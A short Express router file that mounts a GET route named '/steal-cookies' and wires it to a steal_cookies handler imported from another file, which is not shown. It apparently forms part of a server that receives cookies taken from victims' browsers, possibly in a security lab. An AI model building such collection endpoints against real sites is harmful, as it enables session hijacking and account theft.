import express from 'express'

import {steal_cookies} from "./steal-cookies.js"
const router = express.Router()

router.get('/steal-cookies', steal_cookies)
export default router